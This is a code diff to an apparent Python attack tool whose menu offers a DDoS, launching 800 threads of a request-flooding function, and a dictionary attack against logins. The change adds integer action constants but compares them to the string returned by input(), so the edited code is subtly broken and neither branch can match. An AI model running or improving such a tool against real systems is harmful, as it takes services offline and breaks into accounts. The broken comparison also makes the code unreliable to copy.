@@ -4,6 +4,9 @@ from requests.packages.urllib3.connectionpool import HTTPConnectionPool
 from bs4 import BeautifulSoup as BS
 from time import time, sleep
 
+ACTION_DDOS=1
+ACTION_DICT_ATTACK=2
+
 def _make_request(self,conn,method,url,**kwargs):
     response = self._old_make_request(conn,method,url,**kwargs)
     sock = getattr(conn,'sock',False)
@@ -62,14 +65,16 @@ def dict_attack():
 if __name__ == '__main__':
     print('1. Ddos ')
     print('2. Dict attack ')
-    choose = input(" Change: ")
-    if choose=='1':
+    choose = input(f" Change:  ")
+    if choose not in (ACTION_DDOS, ACTION_DICT_ATTACK):
+        print('Not avaible action')
+    if choose==ACTION_DDOS:
         for i in range(800):
             print(i)
             thr = Thread(target=ddos_requests_send)
             thr.start()
             sleep(1)
-    elif choose=='2':
+    elif choose==ACTION_DICT_ATTACK:
         dict_attack()
 
 
